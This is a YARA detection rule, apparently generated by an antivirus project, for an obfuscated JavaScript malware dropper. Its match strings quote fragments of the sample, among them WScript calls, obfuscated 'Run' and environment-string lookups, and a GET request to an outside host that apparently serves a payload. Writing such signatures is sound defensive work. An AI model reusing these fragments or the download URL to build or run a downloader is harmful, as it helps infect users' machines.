rule sig_20160428_5edea128473fa02039b00979a7d2d2bd {
  meta:
    description = "datamaliciousorder - file 20160428_5edea128473fa02039b00979a7d2d2bd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0eebce8b97e2b58a51787842e3fec538083a03211553ae53b5d875034e51d64d"

  strings:
    $s1  = "function AuxMxySzbMrxUqrQcyYbe(WmgJglMuxHaxYkcTntMpk, MqwTqpSfcDwbCqeKodRqd){ZzmBihNksKjgQmhNntBfw = ZzmBihNksKjgQmhNntBfw * 1; " ascii
    $s2  = "return WmgJglMuxHaxYkcTntMpk - MqwTqpSfcDwbCqeKodRqd;};" fullword ascii
    $s3  = "function EpjKecYfeVcgFycErxEyp(KtmMakYarFzvMnfZviIbi){DloXenQgrAbvTanBowZjy[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function JesVmzLqgPhgNwvYchYph() {return DloXenQgrAbvTanBowZjy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "function EpjKecYfeVcgFycErxEyp(KtmMakYarFzvMnfZviIbi){DloXenQgrAbvTanBowZjy[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "var DloXenQgrAbvTanBowZjy = function OliFyyGxaLppHtjGqfLhn() {return UptWqfAvjWwdWezLduVmj[YucQrfNnmAutAttGsdBwv](\"WScript\"+\"" ascii
    $s7  = "function AuxMxySzbMrxUqrQcyYbe(WmgJglMuxHaxYkcTntMpk, MqwTqpSfcDwbCqeKodRqd){ZzmBihNksKjgQmhNntBfw = ZzmBihNksKjgQmhNntBfw * 1; " ascii
    $s8  = "VnhDndRbfYriUftAtqIkj[GvvBtdPurQhfBbkBdfIcy](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s9  = "var UptWqfAvjWwdWezLduVmj = this[\"WScript\"];" fullword ascii
    $s10 = "var DloXenQgrAbvTanBowZjy = function OliFyyGxaLppHtjGqfLhn() {return UptWqfAvjWwdWezLduVmj[YucQrfNnmAutAttGsdBwv](\"WScript\"+\"" ascii
    $s11 = "function JesVmzLqgPhgNwvYchYph() {return DloXenQgrAbvTanBowZjy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "function TkxVpmNhrLgnEpmYuuWxo(){return ElqMzrPujCerHsxUbqBbw + \"\";};" fullword ascii
    $s13 = "if (VnhDndRbfYriUftAtqIkj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function SfpMyqRbcSurYnsUkqRjp() {return ((JzlDtwFhcEihHzlXvpMsa == true) && (JzlDtwFhcEihHzlXvpMsa == NjhIlnZvlVnyTndNbjDvm)) ?" ascii
    $s15 = "function SfpMyqRbcSurYnsUkqRjp() {return ((JzlDtwFhcEihHzlXvpMsa == true) && (JzlDtwFhcEihHzlXvpMsa == NjhIlnZvlVnyTndNbjDvm)) ?" ascii
    $s16 = "}while (DoeSymDusSsdTmpTssAkx);" fullword ascii
    $s17 = "MkbDwvKobCopEavAyxRfc = true;" fullword ascii
    $s18 = "function NrhUpcLzwOymLobHrlQei()" fullword ascii
    $s19 = "NjhIlnZvlVnyTndNbjDvm = true; " fullword ascii
    $s20 = "function SqlUubMbzCpqHfkAohPle(MhkZxwSjaMamUiyLbuPnw) {var QqgIhaPpkSeaZjfFpcHar = (1, 2, 3, 4, 5, MhkZxwSjaMamUiyLbuPnw); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}